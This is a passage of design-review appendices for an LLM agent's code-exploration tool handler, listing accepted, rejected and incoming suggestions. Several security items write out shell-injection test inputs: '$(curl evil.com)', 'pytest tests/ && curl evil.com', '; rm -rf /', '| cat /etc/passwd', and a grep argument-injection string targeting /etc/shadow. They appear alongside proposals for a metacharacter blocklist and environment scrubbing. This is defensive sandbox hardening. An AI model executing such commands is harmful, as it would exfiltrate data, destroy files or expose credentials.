| R5-S3 | Add context window management to prevent message history from exceeding the model's per-request limit. | claude-4 (claude-opus-4-6) | This is a correctness bug, not just optimization. Token budget tracks cumulative spend; context window is a per-request constraint. With 15 iterations of verbose tool results, the messages array can exceed the model's limit and cause API errors. The API will return a 400, crashing the loop. | 2026-02-20 02:21:54 UTC |
| R5-S4 | Update plan Sections 4 and 5 to use ToolResult return type consistently, matching the accepted R1-S4/R1-F1 resolution. | claude-4 (claude-opus-4-6) | The plan body still says handle_tool_use returns str, contradicting the accepted ToolResult resolution. Implementers reading the plan (not the appendix) will use the wrong return type. This is a residual inconsistency that must be fixed. | 2026-02-20 02:21:54 UTC |
| R5-S5 | Add structured logging alongside OTel instrumentation for production debugging. | claude-4 (claude-opus-4-6) | OTel traces require a trace backend; structured logs work everywhere and are the first place operators look. The plan has zero logging statements. Per-tool-call structured logs are essential for debugging failed explorations. | 2026-02-20 02:21:54 UTC |
| R5-S7 | Specify behavior when token budget is exceeded mid-tool_use to avoid malformed conversation history. | claude-4 (claude-opus-4-6) | If budget check triggers between LLM response (with tool_use blocks) and tool execution, the conversation ends with unanswered tool_use — which is malformed input for parse_final_output. This is a real edge case that needs explicit handling. | 2026-02-20 02:21:54 UTC |
| R5-S8 | Specify how parse_final_output handles conversations that never reached end_turn. | claude-4 (claude-opus-4-6) | If all 15 iterations were tool_use or budget was hit, the final message may contain tool_use blocks, not a final answer. parse_final_output needs explicit guidance for extracting results from incomplete conversations, especially with R3-F4's partial/confidence fields. | 2026-02-20 02:21:54 UTC |
| R5-S9 | Set supports_feature_serial = True for ExplorePhaseHandler since tools operate on shared mutable state. | claude-4 (claude-opus-4-6) | Concurrent run_test invocations against the same project can produce flaky results due to shared filesystem, test database state, and file locks. This is a correctness issue, not just performance. | 2026-02-20 02:21:54 UTC |
| R5-S10 | Reject shell metacharacters in run_test commands or switch to shell=False with shlex.split(). | claude-4 (claude-opus-4-6) | R4-F1 required anchored regex and metacharacter prohibition, but the plan only anchors the prefix. With shell=True, anything after the prefix (e.g., $(curl evil.com)) is shell-interpreted. This is a residual command injection gap. | 2026-02-20 02:21:54 UTC |
| R6-S1 | Add -I (ignore binary) and default directory excludes (.git, node_modules, venv, __pycache__) to grep in _search_codebase. | gemini-3 (gemini-3-pro-preview) | grep -r without excludes will scan binaries and massive dependency trees, causing timeouts and garbage output. This is a practical usability and performance fix. | 2026-02-20 02:21:54 UTC |
| R6-S2 | Use head+tail truncation strategy for _run_test output instead of simple truncation. | gemini-3 (gemini-3-pro-preview) | Test failures and stack traces appear at the end of output. Simple truncation hides the actual error from the LLM, making the exploration tool much less useful. | 2026-02-20 02:21:54 UTC |
| R6-S3 | Pass run_metadata (including stop_reason) to parse_final_output so it can set the partial flag. | gemini-3 (gemini-3-pro-preview) | Accepted R3-F4 requires distinguishing 'nothing found' from 'timeout/budget exhausted'. The parser needs stop_reason to correctly set the partial flag. This is a necessary interface change to fulfill an accepted requirement. | 2026-02-20 02:21:54 UTC |
| R6-S4 | Append a [TRUNCATED] marker to _read_file output when the line cap is hit. | gemini-3 (gemini-3-pro-preview) | Without an explicit marker, the LLM treats truncated output as complete, leading to hallucinations about missing code. This is a simple, high-value change. | 2026-02-20 02:21:54 UTC |
| R6-S5 | Add issue_description to the Explore phase entry requirements in context_schema.py. | gemini-3 (gemini-3-pro-preview) | _build_initial_message depends on issue_description to give the agent a goal. Without context validation, the phase starts but wastes money with an aimless agent. | 2026-02-20 02:21:54 UTC |
| R6-S6 | Handle BadRequestError (context window exhaustion) in the agent loop as a forced stop with partial results. | gemini-3 (gemini-3-pro-preview) | This directly complements R5-S3 (context window management). Even with proactive management, edge cases can still hit the limit. Catching BadRequestError and treating it as forced stop (preserving partial results) is a necessary safety net. | 2026-02-20 02:21:54 UTC |
| R7-S1 | Prevent grep flag injection by using -- to terminate flag parsing and -e to force pattern interpretation in _search_codebase. | claude-4 (claude-opus-4-6) | This is a real command injection vector via argument injection, distinct from shell injection. A pattern like '--include=../../etc/shadow -r /' could bypass project_root restrictions at the grep level. Using 'grep -rn --include=<glob> -- -e <pattern>' is a simple, well-known defensive pattern. | 2026-02-20 02:52:27 UTC |
| R7-S3 | When budget/iteration limits hit mid-tool-use, make one final no-tools LLM call to get a structured summary. | claude-4 (claude-opus-4-6) | This solves a real problem: when the loop exits due to budget exhaustion during tool use, there's no structured output to parse. A reserved-token summary call is an elegant solution that ensures parse_final_output always has something meaningful to work with. | 2026-02-20 02:52:27 UTC |
| R7-S4 | Propagate ToolResult.is_error to the Anthropic API's tool_result is_error field and update handle_tool_use return type. | claude-4 (claude-opus-4-6) | R1-S4 (ToolResult) was accepted but the impact on the execute() loop and Anthropic API format wasn't traced through. The Anthropic API supports is_error on tool_result blocks, and using it helps the LLM make better decisions about retrying failed tools. This is a necessary follow-through on an accepted suggestion. | 2026-02-20 02:52:27 UTC |
| R7-S7 | Validate PricingService has pricing data for the specified model during __init__ rather than silently returning $0 at runtime. | claude-4 (claude-opus-4-6) | If cost is silently $0 for unknown models, the global budget enforcement safety net is defeated. Failing fast at construction time is the correct behavior — a simple validation that prevents a subtle and dangerous runtime issue. | 2026-02-20 02:52:27 UTC |
| R7-S8 | Add affected_tests as a validated field with default empty list in ExplorePhaseOutput, and add minimum length validation for fix_approach. | claude-4 (claude-opus-4-6) | affected_tests appears in the context flow example but isn't validated. Downstream IMPLEMENT phase needs test targets. Making it a validated field with default empty list is non-breaking and ensures the field is always present. Minimum length on fix_approach prevents degenerate outputs. | 2026-02-20 02:52:27 UTC |
| R7-S9 | Dynamically calculate max_tokens based on remaining context window space instead of hardcoding 8192. | claude-4 (claude-opus-4-6) | With R6-F2 accepted (context window exhaustion handling), hardcoded max_tokens=8192 creates a concrete failure mode: the API rejects requests when conversation_tokens + max_tokens > context_window. Dynamic calculation is the correct implementation of the accepted R6-F2 requirement. | 2026-02-20 02:52:27 UTC |
| R7-S10 | Reject commands containing shell metacharacters ($, backtick, |, ;, &, etc.) before applying the whitelist regex. | claude-4 (claude-opus-4-6) | R4-F1 (anchoring) was accepted but doesn't prevent inline subshell expansion with shell=True. Shell metacharacter rejection is a necessary complement to regex anchoring. LLMs can hallucinate these patterns innocently, and the fix is a simple character blocklist check before the whitelist regex. | 2026-02-20 02:52:27 UTC |
| R8-S1 | Enforce .gitignore and hidden directory exclusion in _search_codebase and _list_directory. | gemini-3 (gemini-3-pro-preview) | Searching node_modules, .git, or venv wastes massive tokens and confuses the agent with irrelevant library code. This is a practical operational necessity. Using grep's --exclude-dir and filtering in _list_directory are straightforward implementations. | 2026-02-20 02:52:27 UTC |
| R8-S2 | Implement strict character/byte caps on tool outputs in addition to line caps. | gemini-3 (gemini-3-pro-preview) | The plan caps at 10,000 lines but a single line could be enormous (e.g., minified JS). A byte/character cap is essential to prevent context window blowouts from a single tool call. This complements the existing line caps. | 2026-02-20 02:52:27 UTC |
| R8-S3 | Handle text decoding errors in _read_file with errors='replace' fallback. | gemini-3 (gemini-3-pro-preview) | Path.read_text() raises UnicodeDecodeError on non-UTF-8 files. Binary files or legacy encodings would crash the agent loop. Using errors='replace' is a simple, defensive fix that prevents crashes while still returning useful content. | 2026-02-20 02:52:27 UTC |
| R8-S4 | Implement a submit_report tool for structured final output instead of parsing free-text messages. | gemini-3 (gemini-3-pro-preview) | This duplicates R8-F1 which was also accepted. Both identify the same issue and solution. A submit_report tool is the correct architectural pattern for reliable structured output from tool-using agents. | 2026-02-20 02:52:27 UTC |
| R8-S5 | Verify presence of binary dependencies (grep, test runners) during initialization. | gemini-3 (gemini-3-pro-preview) | Failing fast with a clear error when grep is missing is much better than a cryptic subprocess error during execution. This is especially important for Windows or minimal container environments. Simple shutil.which() check in __init__. | 2026-02-20 02:52:27 UTC |
| R8-S6 | Map tool execution failures to Anthropic's is_error field in tool_result blocks. | gemini-3 (gemini-3-pro-preview) | This aligns with R7-S4 (already accepted). The Anthropic API's is_error flag is the correct mechanism for communicating tool failures to the LLM. This is a necessary implementation detail for the accepted ToolResult design. | 2026-02-20 02:52:27 UTC |
| R9-S1 | Require shell=False with shlex.split() for subprocess execution in run_test to eliminate shell injection entirely. | claude-4 (claude-opus-4-6) | shell=True is the root cause of the injection surface. Even with anchored regex (R4-F1), shell metacharacters in arguments can bypass validation. shell=False eliminates the entire class of vulnerability rather than mitigating symptoms. | 2026-02-20 02:58:02 UTC |
| R9-S3 | Define submit_report supersession semantics and interaction with parse_final_output. | claude-4 (claude-opus-4-6) | R8-F1 was accepted but left ambiguous how multiple submit_report calls are handled and how the dual extraction paths interact. This must be resolved before implementation to avoid conflicting behaviors. | 2026-02-20 02:58:02 UTC |
| R9-S4 | Re-evaluate the 2-day implementation estimate given the substantial scope additions from accepted suggestions. | claude-4 (claude-opus-4-6) | The original estimate predates ~40+ accepted suggestions adding submit_report, confidence fields, regex validation, __init_subclass__ enforcement, context window handling, etc. An honest re-estimate prevents schedule pressure from causing quality shortcuts. | 2026-02-20 02:58:02 UTC |
| R9-S5 | Document separation of concerns between get_system_prompt and _build_initial_message regarding context key consumption. | claude-4 (claude-opus-4-6) | Both methods receive context but without documented responsibilities, implementers will either duplicate information (wasting tokens) or omit it. A simple contract (e.g., system prompt = persona/instructions, initial message = task-specific details) prevents this. | 2026-02-20 02:58:02 UTC |
| R9-S7 | Update ExplorePhaseOutput validation rules to handle confidence and partial fields from R3-F4. | claude-4 (claude-opus-4-6) | R3-F4 added confidence and partial fields but the validation model wasn't updated. A strict validator requiring non-empty fault_files would reject legitimate low-confidence partial results. Conditional validation logic is needed. | 2026-02-20 02:58:02 UTC |
| R9-S8 | Resolve contradiction between 'handler mutates context directly' and execute() returning output dict. | claude-4 (claude-opus-4-6) | This is a genuine architectural contradiction that affects testability and the interface contract. The return-value pattern is more testable and aligns with the execute() return type. Must be resolved before implementation. | 2026-02-20 02:58:02 UTC |
| R9-S9 | Add --binary-files=without-match flag to grep invocation in search_codebase. | claude-4 (claude-opus-4-6) | Searching binary files wastes tool execution time, produces garbled results, and causes the LLM to waste iterations on meaningless matches. Adding the -I flag is a one-line fix with significant quality improvement. | 2026-02-20 02:58:02 UTC |
| R9-S10 | Add proactive message history truncation strategy to prevent context window exhaustion. | claude-4 (claude-opus-4-6) | R6-F2 handles reactive context window exhaustion but doesn't prevent it. A single read_file returning 10K lines (~40K tokens) can fill the context window. Proactive truncation of older tool results is essential for reliability. | 2026-02-20 02:58:02 UTC |
| R10-S1 | Handle dangling tool call edge case when loop exits with pending tool_use stop_reason. | gemini-3 (gemini-3-pro-preview) | If the loop breaks due to budget/iterations while the LLM requested a tool, parse_final_output receives an incomplete conversation. Appending a synthetic tool result prevents parsing failures. This complements R9-F4. | 2026-02-20 02:58:02 UTC |
| R10-S2 | Hard-exclude .git, .env, node_modules, __pycache__ from search_codebase and list_directory. | gemini-3 (gemini-3-pro-preview) | Searching .git wastes massive tokens, .env risks leaking secrets, and node_modules produces meaningless noise. Safe defaults are essential for both security and quality of agent output. | 2026-02-20 02:58:02 UTC |
| R10-S3 | Use head+tail truncation for run_test output to preserve failure summaries at the end. | gemini-3 (gemini-3-pro-preview) | Test runners consistently print the most important information (failure details, summary) at the end. Simple head truncation cuts off exactly what the LLM needs most. First 2000 + last 3000 chars is a pragmatic improvement. | 2026-02-20 02:58:02 UTC |
| R10-S4 | Include conversation history in execute() metadata for debugging. | gemini-3 (gemini-3-pro-preview) | Without the transcript, debugging why an agent failed or spent excessive budget is impossible. Including messages in metadata is essential for operational visibility and is cheap to implement. | 2026-02-20 02:58:02 UTC |
| R10-S5 | Allow LLM client injection via __init__ instead of hardcoding Anthropic() instantiation. | gemini-3 (gemini-3-pro-preview) | Hardcoding the client couples the handler to specific environment variable strategies and prevents testing with mock clients without patching. Constructor injection is a standard pattern that improves testability and configuration flexibility. | 2026-02-20 02:58:02 UTC |

### Appendix B: Rejected Suggestions (with Rationale)

| ID | Suggestion | Source | Rejection Rationale | Date |
|----|------------|--------|---------------------|------|
| R2-S5 | Add context_lines parameter to search_codebase tool for surrounding code context. | gemini-3 (gemini-3-pro-preview) | While this would reduce follow-up read_file calls, it's a feature enhancement rather than an architectural or safety concern. The current grep output with file:line:match is functional for v1. The agent can issue read_file calls when it needs context. This optimization can be added in a subsequent iteration. | 2026-02-20 02:09:03 UTC |
| R2-S7 | Capture the LLM's reasoning text (before tool use) in OTel span events. | gemini-3 (gemini-3-pro-preview) | While useful for debugging, this is an observability enhancement that can be added post-v1. The plan already captures tool call events with name, input, duration, and result length. Adding full LLM reasoning text to spans also raises concerns about span size and potential sensitive data in traces. | 2026-02-20 02:09:03 UTC |
| R3-S9 | Add contract tests verifying tool schemas are accepted by the Anthropic API's tool format. | claude-4 (claude-opus-4-6) | R3-S4 (accepted) already validates tool schemas structurally at registration time. Adding separate contract tests against the SDK's Pydantic models is nice-to-have but adds test maintenance burden. SDK version bumps should be caught by existing integration tests. This is over-engineering the validation layer. | 2026-02-20 02:15:20 UTC |
| R4-S2 | Add cost_budget_usd parameter and dynamically calculate token_budget from model pricing. | gemini-3 (gemini-3-pro-preview) | While the concept is valid (see R4-F2 which addresses the requirements gap), implementing dynamic token limit calculation in the handler adds complexity. The workflow already has a global cost_budget. The handler should respect its token_budget and let the workflow handle cost enforcement. R2-F1 (accepted) covers the integration between phase and workflow budgets. | 2026-02-20 02:15:20 UTC |
| R4-S4 | Add enabled_tools parameter to dynamically enable/disable tools like run_test. | gemini-3 (gemini-3-pro-preview) | This is a feature enhancement, not an architectural gap. Users concerned about run_test can subclass and override get_tools(). Adding a configuration parameter for this in v1 is premature — wait for actual user demand. The toolset is small (4 tools) and the subclassing mechanism is sufficient. | 2026-02-20 02:15:20 UTC |
| R4-S10 | Abstract LLM client behind _call_llm interface instead of hardcoding anthropic.Client. | gemini-3 (gemini-3-pro-preview) | R3-S3 (accepted) already defines _call_llm as a concrete method on ToolUsingPhaseHandler. The plan explicitly chose direct Anthropic client over ClaudeAgent with clear rationale (Section 3). The tool_use format is Anthropic-specific. Multi-provider abstraction is a significant scope expansion that isn't justified for v1. Future refactoring can introduce provider abstraction when a second provider is actually needed. | 2026-02-20 02:15:20 UTC |
| R5-S6 | Add fail-fast model validation against PricingService at construction time. | claude-4 (claude-opus-4-6) | R4-F2 (which this depends on) is being rejected — there's no cost_budget parameter requiring dynamic pricing lookup. The existing PricingService is used only for post-hoc cost reporting, where returning 0 for unknown models is acceptable with a warning log. Fail-fast validation is over-engineering for this use case. | 2026-02-20 02:21:54 UTC |
| R7-S2 | Add token_uncertainty counter to account for tokens consumed by failed/retried API calls. | claude-4 (claude-opus-4-6) | This adds significant complexity for an unlikely edge case. The Anthropic API either returns usage data or doesn't charge for the request. Network timeouts before response completion are rare, and the budget check already includes a safety margin. The conservative estimate approach described is over-engineered for v1. | 2026-02-20 02:52:27 UTC |
| R7-S5 | Replace subprocess.run with Popen for explicit kill/wait cleanup and propagate trace context to subprocesses. | claude-4 (claude-opus-4-6) | subprocess.run already handles timeout via SIGTERM and raises TimeoutExpired. Zombie processes from grep or pytest are extremely unlikely in practice since these are short-lived processes. Propagating OTel trace context into grep subprocesses is pointless (grep doesn't emit traces). The Popen complexity is unwarranted for v1. | 2026-02-20 02:52:27 UTC |
| R7-S6 | Add TOCTOU characterization tests for symlink race conditions and document as known limitation. | claude-4 (claude-opus-4-6) | TOCTOU for symlinks is a well-known, low-probability risk in file operations. The plan already handles symlinks with resolve(). Adding a characterization test that doesn't actually test a pass/fail condition adds maintenance burden without security value. A documentation note is sufficient and doesn't need a test. | 2026-02-20 02:52:27 UTC |
| R9-S2 | Specify Anthropic client lifecycle and connection pooling strategy. | claude-4 (claude-opus-4-6) | The Anthropic SDK's httpx transport handles connection management and auto-reconnection transparently. This is an implementation detail that doesn't need requirements-level specification. The SDK is battle-tested for this use pattern. | 2026-02-20 02:58:02 UTC |
| R9-S6 | Document TOCTOU race condition between path validation and file read during concurrent test execution. | claude-4 (claude-opus-4-6) | This is a theoretical concern in a read-only exploration phase. The sequential tool execution (R3-F2 accepted) and the fact that EXPLORE tools are read-only make this extremely unlikely. The honest sandboxing documentation from R3-F3 already covers production deployment recommendations. | 2026-02-20 02:58:02 UTC |

### Appendix C: Incoming Suggestions (Untriaged, append-only)

#### Review Round R1

- **Reviewer**: claude-4 (claude-opus-4-6)
- **Date**: 2026-02-20 02:05:41 UTC
- **Scope**: Architecture-focused review

| ID | Area | Severity | Suggestion | Rationale | Proposed Placement | Validation Approach |
| ---- | ---- | ---- | ---- | ---- | ---- | ---- |
| R1-S1 | security | critical | Add environment variable scrubbing and `env` isolation for `_run_test` subprocess calls — pass an explicit, minimal `env` dict instead of inheriting the parent process environment. | The current plan calls `subprocess.run(command, shell=True, ...)` which inherits all env vars (API keys, secrets, database URLs). A malicious or poorly-written test could exfiltrate these. Even with a command whitelist, test code itself is untrusted. | Section 5 `_run_test` implementation and Section 6 "No Destructive Operations" | Unit test: assert `subprocess.run` is called with an explicit `env` kwarg containing only `PATH`, `HOME`, `LANG`, `PYTHONPATH`, `NODE_PATH`. Integration test: verify `os.environ["ANTHROPIC_API_KEY"]` is not accessible from within a spawned test process. |
| R1-S2 | architecture | high | Make `_build_initial_message(context) -> str` an `@abstractmethod` on `ToolUsingPhaseHandler`, not just a method on `ExplorePhaseHandler`. The plan already identifies this as Risk 6 but does not promote it to an action item. | The `execute()` method on the base class calls `self._build_initial_message(context)`. If a subclass forgets to implement it, this will raise `AttributeError` at runtime instead of failing at class instantiation. The plan's own Risk 6 acknowledges this gap but never closes it. | Section 4 "Abstract Methods" list — add `_build_initial_message` as a fifth abstract method. Update Section 2 `tool_using_handler.py` description. | Static analysis: `mypy --strict` will flag non-abstract call on ABC. Unit test: attempt to instantiate a subclass missing `_build_initial_message` and assert `TypeError` is raised. |
| R1-S3 | risks | high | Define explicit behavior when the agent loop exits due to budget/iteration exhaustion *without* the LLM producing `end_turn`. Currently `parse_final_output` is called on a conversation that may lack a final structured answer. | If the loop exits on `max_iterations` or `token_budget`, the last message may be a tool_result (user role), not an assistant summary. `parse_final_output` will receive an incomplete conversation and likely fail or produce garbage. This is a predictable operational scenario, not an edge case. | Section 4 "Stop Conditions" — add a forced-completion strategy: either (a) make one final LLM call with `tools=[]` and a "please summarize now" prompt, or (b) have `parse_final_output` handle the incomplete case explicitly and return a partial result with `"exhausted": True`. | Unit test: mock LLM to always return `tool_use`, hit `max_iterations`, verify output includes `"exhausted": True` and does not raise. Integration test: set `max_iterations=2` with a complex issue and verify graceful degradation. |
| R1-S4 | interfaces | high | Define a `ToolResult` dataclass or TypedDict for the return value of `handle_tool_use` instead of bare `str`. Include `content: str`, `is_error: bool`, and optionally `truncated: bool`. | The current `str` return type conflates successful output with error messages. The Anthropic API's `tool_result` block supports an `is_error` field that tells the model a tool failed — without it, the LLM may misinterpret error text as valid output and hallucinate conclusions. The feature requirements explicitly state "Raise ToolExecutionError for failures" but the plan says "return error string (don't raise)" — these are contradictory without a structured type. | Section 4 abstract method signature, Section 5 tool implementations, feature requirements `handle_tool_use` docstring | Unit test: trigger a `ToolExecutionError`, verify the tool_result sent to the API has `is_error: true`. Review LLM behavior difference in integration test between error-flagged and non-error-flagged tool results. |
| R1-S5 | security | high | Replace `shell=True` in `_run_test` with explicit argument list construction, or at minimum apply `shlex.split()` and validate each token against the whitelist *after* splitting. | `shell=True` with a string command enables shell injection. The whitelist regex is applied to the *whole string*, so `pytest tests/ && curl evil.com` could pass a regex anchored only at the start. Even with `^` anchoring, shell metacharacters (`;`, `|`, `&&`, backticks, `$()`) can append arbitrary commands after the whitelisted prefix. | Section 5 `_run_test` implementation, Section 6 sandboxing | Unit test: attempt commands with `; rm -rf /`, `| cat /etc/passwd`, `$(curl evil.com)` appended to whitelisted prefixes — all must be rejected. Verify `subprocess.run` is called with `shell=False` and a list of args. |
| R1-S6 | architecture | medium | Introduce a constructor-injectable `client_factory` or accept an `Anthropic` client instance, rather than hard-coding client instantiation inside `__init__`. | Testability: every unit test currently needs to `mock.patch` the Anthropic client at module level. Flexibility: teams may need custom retry config, proxy settings, or alternative base URLs. The plan references MCPGateway as a pattern — but MCPGateway also suffers from tight coupling. This is an opportunity to improve on that pattern. | Section 3 "Decision: Direct Anthropic Client" and `ToolUsingPhaseHandler.__init__` | Unit tests: pass a mock client via constructor, verify no `mock.patch` needed. Integration test: pass a client with a custom `base_url` pointing to a local mock server. |
| R1-S7 | ops | medium | Add a structured log or OTel event when the loop terminates, recording the *reason* for termination (`end_turn`, `max_iterations`, `token_budget`, `max_tokens`). Include this in the returned metadata dict. | Without a `termination_reason` field, operators cannot distinguish between successful completion and budget exhaustion in dashboards or alerting. The plan tracks `iterations` and `tool_calls` but not *why* the loop stopped, making it hard to tune `max_iterations` and `token_budget` in production. | Section 7 "Phase-level attributes" — add `explore.termination_reason` attribute. Section 4 return dict `metadata` — add `"termination_reason"` key. | Unit test: for each stop condition, verify `metadata["termination_reason"]` matches expected value. Dashboard query: filter by `termination_reason == "token_budget"` to identify under-budgeted runs. |
| R1-S8 | validation | medium | Add a schema validation step for the `get_tools()` return value at handler registration time (or at first `execute` call). Validate each tool dict has `name`, `description`, `input_schema` with valid JSON Schema. | If a subclass returns a malformed tool definition, the Anthropic API will return a 400 error deep in the agent loop with a cryptic message. Fail-fast validation at registration time gives a clear, actionable error. This is especially important since `get_tools` is an abstract method that every subclass must implement. | Section 4, before first `_call_llm` invocation — add `self._validate_tool_schemas(tools)`. Or at `register_handler` time in the workflow. | Unit test: pass tools missing `input_schema`, verify `ValueError` raised with descriptive message before any API call. Test with extra unknown fields to confirm forward compatibility. |
| R1-S9 | data | medium | Cap the size of individual tool results returned to the LLM (e.g., 20,000 characters) with a generic truncation wrapper in the base class, not just per-tool limits in the subclass. | The plan caps `read_file` at 10,000 lines and `search_codebase` at 50 results, but a single line could be extremely long (minified JS, data files). A `grep` result of 50 matches in a minified file could be megabytes. There's no base-class safety net. Oversized tool results blow up the context window and waste tokens. | Section 4 agent loop, in `_execute_tool` wrapper — truncate any result exceeding `max_tool_result_chars` (default 30,000) and append `\n[TRUNCATED — {original_len} chars total]`. | Unit test: return a 100,000-char string from `handle_tool_use`, verify it is truncated to limit with truncation notice appended. Verify token count metadata reflects actual tokens sent. |
| R1-S10 | risks | medium | Address the `max_tokens` response truncation case explicitly. When `stop_reason == "max_tokens"`, the assistant's response is incomplete — appending it as-is and breaking creates a malformed conversation (potentially mid-JSON, mid-sentence). | Section 4 lists `max_tokens` as a stop condition ("treat as forced end, break") but does not handle the fact that the truncated message may contain partial tool_use blocks that can't be parsed, or partial text that `parse_final_output` can't interpret. This is distinct from R1-S3 (budget exhaustion) — here the individual *response* is truncated. | Section 4 "Stop Conditions" — add handling: if `stop_reason == "max_tokens"` and response contains partial tool_use blocks, discard them and retry with higher `max_tokens` (up to a cap), or append only text blocks and proceed to `parse_final_output` with a warning. | Unit test: mock a response with `stop_reason="max_tokens"` and a content list containing a `TextBlock` followed by an incomplete `ToolUseBlock`. Verify no crash and `termination_reason` is set to `"max_tokens_truncation"`. |

**Endorsements** (prior untriaged suggestions this reviewer agrees with):
- (none — this is the first review round)

---

#### Feature Requirements Suggestions

| ID | Section | Issue Type | Description | Impact | Suggested Resolution |
| ---- | ---- | ---- | ---- | ---- | ---- |
| R1-F1 | Interface Design — `handle_tool_use` | Contradiction | The docstring says "Raise `ToolExecutionError` for failures" but the plan (Section 5, `_read_file`) says "return error string (don't raise — LLM should see errors)." These are contradictory instructions for implementers. | Subclass authors will be confused about error handling contract. Some will raise, some will return strings, leading to inconsistent behavior and potential unhandled exceptions in the agent loop. | Clarify: `handle_tool_use` should return a `ToolResult` (see R1-S4). For expected tool failures (file not found, timeout), return `ToolResult(content=error_msg, is_error=True)`. For unexpected failures (bugs in tool code), let exceptions propagate to the base class's `_execute_tool` wrapper which catches and converts them. |
| R1-F2 | Interface Design — `_build_initial_message` | Missing from ABC | `_build_initial_message` is called in `execute()` but is not listed as an `@abstractmethod` on `ToolUsingPhaseHandler`. It only appears in `ExplorePhaseHandler`. | Subclasses can be instantiated without implementing this method, causing `AttributeError` at runtime. | Add `_build_initial_message(self, context: dict[str, Any]) -> str` as an abstract method on `ToolUsingPhaseHandler`. (The plan's Risk 6 notes this but the requirements doc doesn't fix it.) |
| R1-F3 | Tool Safety — `run_test` | Ambiguity | The whitelist regex pattern is described informally ("pytest, unittest, npm test, etc.") but no exact regex is specified. The "etc." is dangerous for a security boundary. | Implementers must guess which commands are allowed. Different interpretations lead to either too-permissive (security hole) or too-restrictive (broken functionality) implementations. | Provide the exact whitelist regex in the requirements. Specify whether arguments after the whitelisted command prefix are unrestricted or also validated. |
| R1-F4 | Integration — Phase Registration | Ambiguity | The example shows `phases=["explore"] + WorkflowPhase.ordered()` using a string, but the plan uses `phases=[WorkflowPhase.EXPLORE] + WorkflowPhase.ordered()` using an enum. The requirements doc and plan are inconsistent on whether phases are strings or enums. | Implementers may use the wrong type, causing registration failures or key mismatches. | Standardize on one type. Since `WorkflowPhase` is an enum, use the enum consistently. Update the requirements example to match. |
| R1-F5 | OTel Instrumentation | Missing detail | The requirements specify span names and attributes but do not specify which OTel `SpanKind` to use, or whether tool call spans should be children of the iteration span or siblings. | Inconsistent span hierarchy makes traces hard to read in Jaeger/Tempo. Missing `SpanKind` means default `INTERNAL` is used even for subprocess calls that arguably are `SpanKind.CLIENT`. | Specify: iteration spans are `INTERNAL` children of the phase span. Tool call events remain as events (not separate spans) unless they exceed a duration threshold. `_run_test` subprocess calls should be separate child spans with `SpanKind.INTERNAL`. |
| R1-F6 | Bounded Iteration | Missing detail | The `token_budget` default is 50,000 in the class definition but 10,000 in the integration example. No guidance on how to choose a budget for different tasks. | Users will pick arbitrary values. Too low → premature termination. Too high → cost overruns. | Provide sizing guidance: "A typical explore run on a medium-sized Python project uses 15,000–30,000 tokens. Set `token_budget` to 2× expected usage for safety margin." Reconcile the 50K vs 10K discrepancy. |

---

#### Requirements Coverage

| Feature Doc Section | Plan Step(s) | Coverage | Gaps |
| ---- | ---- | ---- | ---- |
| Tool registry (`get_tools`) | Section 4 (Abstract Methods), Section 5 (Tool Implementations) | Full | No schema validation at registration time (see R1-S8) |
| Agent loop (LLM → tool_use → execute → feedback) | Section 4 (Agent Loop Implementation) | Partial | Missing: behavior on budget exhaustion without end_turn (R1-S3), max_tokens truncation handling (R1-S10), termination reason tracking (R1-S7) |
| Bounded iteration (max turns, token budget) | Section 4 (Stop Conditions), Section 6 (Resource Limits) | Full | Token budget default inconsistency between requirements (50K) and example (10K) (R1-F6) |
| Full cost tracking | Section 3 (references PricingService), Section 4 (cost calculation in execute) | Full | — |
| OTel instrumentation per tool call | Section 7 (OTel Instrumentation) | Partial | Missing SpanKind specification (R1-F5), missing termination_reason attribute (R1-S7) |
| Sandboxing (path restriction, resource limits) | Section 5, Section 6 | Partial | Missing: env var isolation for subprocess (R1-S1), shell injection risk (R1-S5), base-class tool result size cap (R1-S9) |
| No destructive operations | Section 6 (No Destructive Operations) | Partial | `shell=True` + string commands undermine the read-only guarantee (R1-S5) |
| Context flow (explore → design → implement) | Section 8 (Integration) | Full | — |
| ExplorePhaseHandler (4 tools) | Section 5 (Tool Implementations) | Full | — |
| System prompt with codebase map | Section 5 (`get_system_prompt`) | Full | — |
| Output parsing (localization report) | Section 5 (`parse_final_output`), Phase 3 in sequencing | Partial | No fallback strategy when LLM doesn't produce structured output on budget exhaustion (R1-S3) |
| WorkflowPhase enum extension | Section 8, Phase 1 in sequencing | Full | String vs enum inconsistency in requirements (R1-F4) |
| Unit tests | Section 9 | Full | — |
| Integration tests | Section 10 | Full | — |

#### Review Round R2
- **Reviewer**: gemini-3 (gemini-3-pro-preview)
- **Date**: 2026-02-20 02:07:20 UTC
- **Scope**: Architecture-focused review

| ID | Area | Severity | Suggestion | Rationale | Proposed Placement | Validation Approach |
| ---- | ---- | ---- | ---- | ---- | ---- | ---- |
| R2-S1 | Security | Critical | Remove `shell=True` from `_run_test` and use `shlex.split()` with strict executable validation. | Relying on regex validation with `shell=True` is vulnerable to shell injection (e.g., chaining commands with `;`). `shell=False` ensures arguments are passed safely. | `ExplorePhaseHandler._run_test` | Unit test attempting command injection (e.g., `pytest; rm -rf /`) verifies it fails or treats the injection as an argument. |
| R2-S2 | Architecture | High | Inject the LLM client or use a factory instead of direct `Anthropic` instantiation. | Direct instantiation bypasses centralized configuration (proxies, custom base URLs, API key rotation) and makes unit testing difficult (requires patching `anthropic.Anthropic` globally). | `ToolUsingPhaseHandler.__init__` | Verify `ClaudeAgent` or `ClientFactory` is used; verify tests can inject a mock client without patching external libraries. |
| R2-S3 | Architecture | Medium | Standardize Context Output: Handler should return data in `"output"`, Orchestrator updates `context`. | The plan suggests the handler mutates `context["localization"]` directly. This violates the `AbstractPhaseHandler` contract where the *Workflow* manages state transitions based on the return value. | `ExplorePhaseHandler.execute` (return value) & `ArtisanContractorWorkflow` (context update) | Verify handler returns the localization dict; verify workflow integration test shows context updated *after* handler returns. |
| R2-S4 | Risks | Medium | Implement "Stuck Loop" detection (repeated identical tool calls). | LLMs can get into loops (e.g., reading the same file 10 times). This wastes the token budget and time. | `ToolUsingPhaseHandler.execute` (loop logic) | Unit test: Mock LLM returning the same tool call 3 times; verify loop terminates early with an error or forced progression. |
| R2-S5 | Ops | Medium | Add `context_lines` (grep `-C`) to `search_codebase` tool. | Regex matches without context are often useless for understanding code flow, forcing the agent to issue a subsequent `read_file` call, wasting turns. | `ExplorePhaseHandler.get_tools` and implementation | Verify `search_codebase` output contains surrounding lines. |
